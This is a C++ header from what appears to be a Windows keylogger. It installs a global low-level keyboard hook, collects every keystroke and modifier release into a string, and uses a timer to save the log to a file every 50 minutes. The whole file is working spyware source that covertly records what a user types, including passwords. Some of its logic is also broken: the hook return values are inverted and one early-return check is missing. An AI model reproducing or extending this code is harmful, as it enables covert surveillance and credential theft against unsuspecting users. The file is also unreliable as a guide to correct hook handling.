#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"

std::string keylog = "";

void Writekeys()
{
    if(keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File Creation is not Successfull. Keylog '"+ keylog +"'");
        return;
    }
}

Timer Keywriter(Writekeys, 50 * 60, Timer::Infinite); //timer for saving to file

HHOOK eHook = NULL;

LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode<0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam==WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keylog+='\n';
    }
    else if(wparam==WM_KEYUP|| wparam==WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key==VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_RSHIFT
           || key == VK_LSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1,"/");
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook,nCode,wparam,lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer started");
    try{
    Keywriter.Start(true);
    }
    catch(...){
        Helper::WriteAppLog("Hook Failed");
    }
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc,
                             GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHoked()
{
    return(bool)(eHook == NULL);
}



#endif // KEY_HOOK
